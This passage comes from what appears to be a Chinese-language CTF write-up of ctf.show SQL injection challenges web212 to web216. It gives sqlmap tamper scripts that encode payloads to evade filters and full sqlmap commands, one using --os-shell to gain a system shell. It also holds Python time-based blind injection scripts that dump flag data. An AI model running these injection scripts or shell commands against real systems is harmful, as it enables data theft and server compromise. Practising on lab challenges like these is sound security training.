class="token punctuation">(</span><span class="token string">"COUNT(*)"</span><span class="token punctuation">,</span><span class="token string">"count(id)"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    retVal <span class="token operator">=</span> strrev<span class="token punctuation">(</span>retVal<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    retVal <span class="token operator">=</span> strrev<span class="token punctuation">(</span>retVal<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token keyword">return</span> retVal</pre></td></tr></table></figure><p>payload</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>sqlmap <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token comment">//092c2f42-d391-48ec-8da1-81ea7d91d5fa.challenge.ctf.show/api/index.php --safe-url=http://092c2f42-d391-48ec-8da1-81ea7d91d5fa.challenge.ctf.show/api/getToken.php --safe-freq=1 --data="id=1" --tamper=web212 --dbms=mysql --method=PUT --headers="Content-Type: text/plain" --level=3 -D ctfshow_web -T ctfshow_flavis -C ctfshow_flagxsa --dump</span></pre></td></tr></table></figure><h4 id="web213-sqlmap的使用-os-shell"><a class="anchor" href="#web213-sqlmap的使用-os-shell">#</a> <strong>web213 sqlmap 的使用 --os-shell</strong></h4>
<pre><code>--os-shell 反弹操作系统的shell
原理大致是：
用into outfile函数将一个可以用来上传的php文件写到网站的根目录下，之后再上传一个文件，这个文件 可以用来执行系统命令，并且将结果返回出来。
--os-shell的使用条件 
（1）网站必须是root权限 
（2）攻击者需要知道网站的绝对路径 
（3）GPC为off，php主动转义的功能关闭
--is-dba --current-user 可以去查看是否是管理员权限
</code></pre>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 练习使用 --os-shell 一键 getshell</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where id = '"</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 0,1;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">// 对查询字符进行解密</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">function</span> <span class="token function-definition function">decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ |\*/'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>tamper 脚本</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#!/usr/bin/env python</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># -*- coding: UTF-8 -*-</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#@File：web213.py</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">#@Author：Sirius</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#@Date：2022/4/29 17:43 </span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">import</span> base64</pre></td></tr><tr><td data-num="10"></td><td><pre>__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    payload <span class="token operator">=</span> space2comment<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">return</span> payload</pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">def</span> <span class="token function">strrev</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">return</span> payload<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">def</span> <span class="token function">space2comment</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    retVal <span class="token operator">=</span> payload</pre></td></tr><tr><td data-num="21"></td><td><pre>    retVal <span class="token operator">=</span> retVal<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-- -"</span><span class="token punctuation">,</span><span class="token string">"#"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    retVal <span class="token operator">=</span> retVal<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    retVal <span class="token operator">=</span> retVal<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"COUNT(*)"</span><span class="token punctuation">,</span><span class="token string">"count(id)"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    retVal <span class="token operator">=</span> strrev<span class="token punctuation">(</span>retVal<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    retVal <span class="token operator">=</span> strrev<span class="token punctuation">(</span>retVal<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token keyword">return</span> retVal</pre></td></tr></table></figure><p>payload</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>sqlmap <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token comment">//f52be2b2-0cc1-4eb3-9138-fb79af6b622f.challenge.ctf.show/api/index.php --safe-url=http://f52be2b2-0cc1-4eb3-9138-fb79af6b622f.challenge.ctf.show/api/getToken.php --safe-freq=1 --data="id=1" --tamper=web213 --dbms=mysql --method=PUT --headers="Content-Type: text/plain" --level=3 --dbs --os-shell --threads=20</span></pre></td></tr></table></figure><h4 id="web-214-时间盲注寻找注入点"><a class="anchor" href="#web-214-时间盲注寻找注入点">#</a> web 214 时间盲注 — 寻找注入点</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 查询语句</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 无</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// 返回逻辑</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">// 屏蔽危险分子</span></pre></td></tr></table></figure><p>题目首页抓包发现注入点，找了半天。</p>
<p><img data-src="../../../systemdefault/%25E5%259B%25BE%25E7%2589%2587/CTF/image-20220506152657008.png" alt="image-20220506152657008" /></p>
<p>脚本一</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>url <span class="token operator">=</span> <span class="token string">"http://8a60ad35-2fd7-4e96-9daf-f042613695b5.challenge.ctf.show/api/"</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>i <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    i <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    head <span class="token operator">=</span> <span class="token number">32</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    tail <span class="token operator">=</span> <span class="token number">127</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">while</span> tail <span class="token operator">></span> head<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token comment"># 查表名</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token comment">#payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token comment"># 查列名字 - id.flag</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token comment">#payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'"</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token comment"># 查数据</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        payload <span class="token operator">=</span> <span class="token string">"select flaga from ctfshow_flagx"</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(0.5),1)"</span></span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="30"></td><td><pre>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span>timeout <span class="token operator">=</span> <span class="token number">0.5</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>            tail <span class="token operator">=</span> mid</pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="33"></td><td><pre>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="35"></td><td><pre>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="37"></td><td><pre>        <span class="token keyword">break</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr></table></figure><p>脚本二</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>url <span class="token operator">=</span> <span class="token string">"http://05bede9d-453e-49b1-8d31-e32b579d23cc.challenge.ctf.show/api/"</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    head <span class="token operator">=</span> <span class="token number">32</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    tail <span class="token operator">=</span> <span class="token number">128</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token comment"># 查表名</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token comment"># 查列名字 - id.flag</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'"</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token comment"># 查数据</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        payload <span class="token operator">=</span> <span class="token string">"select flaga from ctfshow_flagx"</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)) > </span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(0.5),1)"</span></span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="22"></td><td><pre>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>            tail <span class="token operator">=</span> mid</pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="28"></td><td><pre>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr></table></figure><h4 id="web-215-时间盲注闭合单引号"><a class="anchor" href="#web-215-时间盲注闭合单引号">#</a> web 215 时间盲注 — 闭合单引号</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>查询语句</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 用了单引号</span></pre></td></tr><tr><td data-num="3"></td><td><pre>返回逻辑</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">// 屏蔽危险分子</span></pre></td></tr></table></figure><p>测试语句<img data-src="../../../systemdefault/%25E5%259B%25BE%25E7%2589%2587/CTF/image-20220506152713917.png" alt="image-20220506152713917" /></p>
<p>脚本</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>url <span class="token operator">=</span> <span class="token string">"http://4c038594-0f5e-4414-8090-78b5cb935ef5.challenge.ctf.show/api/"</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>i <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    i <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    head <span class="token operator">=</span> <span class="token number">32</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    tail <span class="token operator">=</span> <span class="token number">127</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">while</span> tail <span class="token operator">></span> head<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token comment"># 查表名</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token comment">#payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token comment">#查列名字 - id.flag</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token comment">#payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'"</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token comment"># 查数据</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        payload <span class="token operator">=</span> <span class="token string">"select flagaa from ctfshow_flagxc"</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1' or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(0.5),1)#"</span></span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="30"></td><td><pre>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span>timeout <span class="token operator">=</span> <span class="token number">0.5</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>            tail <span class="token operator">=</span> mid</pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="33"></td><td><pre>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="35"></td><td><pre>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="37"></td><td><pre>        <span class="token keyword">break</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr></table></figure><h4 id="web-216-时间盲注注入点加密"><a class="anchor" href="#web-216-时间盲注注入点加密">#</a> web 216 时间盲注 — 注入点加密</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 查询语句</span></pre></td></tr><tr><td data-num="2"></td><td><pre>where id <span class="token operator">=</span> <span class="token function">from_base64</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// 返回逻辑</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">// 屏蔽危险分子</span></pre></td></tr></table></figure><p>测试语句，单引号闭合字符串，不然 base64 解密不了，但是数字可以。</p>
<p><img data-src="../../../systemdefault/%25E5%259B%25BE%25E7%2589%2587/CTF/image-20220506152958463.png" alt="image-20220506152958463" /></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>url <span class="token operator">=</span> <span class="token string">"http://62cadfeb-b970-44dc-bab8-69bc47d40ef5.challenge.ctf.show/api/"</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>i <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    i <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    head <span class="token operator">=</span> <span class="token number">32</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    tail <span class="token operator">=</span> <span class="token number">127</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">while</span> tail <span class="token operator">></span> head<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token comment"># 查表名</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token comment">#payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token comment">#查列名字 - id.flag</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token comment">#payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxcc'"</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token comment"># 查数据</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        payload <span class="token operator">=</span> <span class="token string">"select flagaac from ctfshow_flagxcc"</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"'a') or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(1.5),1)#"</span></span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            <span class="token comment">#"ip": f"1) or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))>&#123;mid&#125;,sleep(1.5),1)#",</span></pre></td></tr><tr><td data-num="26"></td><td><pre>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre>        <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="31"></td><td><pre>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span>timeout <span class="token operator">=</span> <span class="token number">1.5</span><span class="token punctuation">)</span></pre></td></tr><tr><td 